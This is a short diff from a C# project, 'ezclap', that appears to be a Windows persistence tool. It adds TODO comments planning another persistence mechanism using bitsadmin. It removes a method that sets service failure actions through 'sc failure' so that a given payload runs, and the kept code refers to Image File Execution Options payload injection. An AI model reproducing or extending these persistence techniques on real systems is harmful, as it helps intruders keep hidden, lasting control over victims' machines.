@@ -5,6 +5,11 @@ using System.Collections.Generic;
 using Microsoft.Win32;
 using Microsoft.Win32.TaskScheduler;
 
+/*
+ *  TODO: Implement yaml configuration parser 
+ *  TODO: Implement non-registry persistence mechanism, such as bitsadmin 
+ *  TODO: Get code review and audit from other colleagues 
+ */
 
 
 namespace ezclap
@@ -20,14 +25,6 @@ namespace ezclap
             System.Diagnostics.Process.Start(@"C:\Windows\System32\sc.exe", arguments);
         }
 
-        public static void modifyFailureService(List<string> services, string payload)
-        {
-            foreach (string service in services)
-            {
-                string argument = "/C sc failure " + service + " reset= 10 actions= run/5000//// command= \"" + payload + "\" ";
-                System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", argument);
-            }
-        }
 
         public static void modifyImageFileExec(string payload)
         {
